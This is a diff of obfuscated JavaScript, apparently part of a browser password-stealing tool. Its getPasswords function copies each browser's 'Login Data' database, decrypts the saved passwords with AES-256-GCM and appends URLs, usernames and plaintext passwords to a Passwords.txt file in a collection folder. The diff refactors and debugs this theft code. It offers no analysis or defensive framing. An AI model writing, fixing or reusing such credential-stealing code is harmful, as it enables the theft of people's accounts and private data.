@@ -1918,7 +1918,7 @@ async function getExtension() {
 
   if (fs.existsSync(passwordsFilePath)) {
     const passwordsContent = fs.readFileSync(passwordsFilePath, 'utf-8');
-    const passwordsEntries = passwordsContent.split('================').filter(entry => entry.trim() !== '');
+    const passwordsEntries = passwordsContent.split('URL').filter(entry => entry.trim() !== '');
     passwordsCount = passwordsEntries.length;
   }
 
@@ -2014,22 +2014,22 @@ async function getExtension() {
 
 
 async function getPasswords() {
-const _0x540754 = []; // Define _0x540754 at the beginning of the function
-const passwordsData = [];
-  for (let _0x261d97 = 0; _0x261d97 < browser_paths.length; _0x261d97++) {
-    if (!fs.existsSync(browser_paths[_0x261d97][0])) {
+  const _0x540754 = [];
+
+  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
+    if (!fs.existsSync(browserPath[_0x261d97][0])) {
       continue;
     }
 
     let _0xd541c2;
-    if (browser_paths[_0x261d97][0].includes('Local')) {
-      _0xd541c2 = browser_paths[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
+    if (browserPath[_0x261d97][0].includes('Local')) {
+      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
     } else {
-      _0xd541c2 = browser_paths[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
+      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
     }
 
-    const _0x256bed = browser_paths[_0x261d97][0] + 'Login Data';
-    const _0x239644 = browser_paths[_0x261d97][0] + 'passwords.db';
+    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
+    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';
 
     fs.copyFileSync(_0x256bed, _0x239644);
 
@@ -2043,14 +2043,14 @@ const passwordsData = [];
             return;
           }
 
-          let _0x3d2b4b = _0x504e35.password_value;
           try {
+            let _0x3d2b4b = _0x504e35.password_value;
             const _0x5e1041 = _0x3d2b4b.slice(3, 15);
             const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
             const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
             const _0x210aeb = crypto.createDecipheriv(
               'aes-256-gcm',
-              browser_paths[_0x261d97][3],
+              Buffer.from(browserPath[_0x261d97][3], 'hex'),
               _0x5e1041
             );
             _0x210aeb.setAuthTag(_0x2a933a);
@@ -2058,7 +2058,7 @@ const passwordsData = [];
               _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
               _0x210aeb.final('utf-8');
 
-            passwordsData.push(
+            _0x540754.push(
               '================\nURL: ' +
                 _0x504e35.origin_url +
                 '\nUsername: ' +
@@ -2068,7 +2068,7 @@ const passwordsData = [];
                 '\nApplication: ' +
                 _0xd541c2 +
                 ' ' +
-                browser_paths[_0x261d97][1] +
+                browserPath[_0x261d97][1] +
                 '\n'
             );
           } catch (_0x5bf37a) {}
@@ -2080,23 +2080,22 @@ const passwordsData = [];
     });
   }
 
-  if (passwordsData.length === 0) {
-    passwordsData.push('User as no Password :/ ');
+  if (_0x540754.length === 0) {
+    _0x540754.push('no password found for ');
   }
 
-  const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
-  const passwordsFilePath = path.join(passwordsFolderPath, 'passwords.txt');
+  if (_0x540754.length) {
+    const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
+    if (!fs.existsSync(passwordsFolderPath)) {
+      fs.mkdirSync(passwordsFolderPath);
+    }
 
-  if (!fs.existsSync(passwordsFolderPath)) {
-    fs.mkdirSync(passwordsFolderPath);
+    const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
+    fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
+      encoding: 'utf8',
+      flag: 'a+',
+    });
   }
-
-  fs.writeFileSync(passwordsFilePath, user.copyright + passwordsData.join(''), {
-    encoding: 'utf8',
-    flag: 'a+',
-  });
-
-  moveFileToFolder(passwordsFilePath, 'Passwords');
 }
 
 
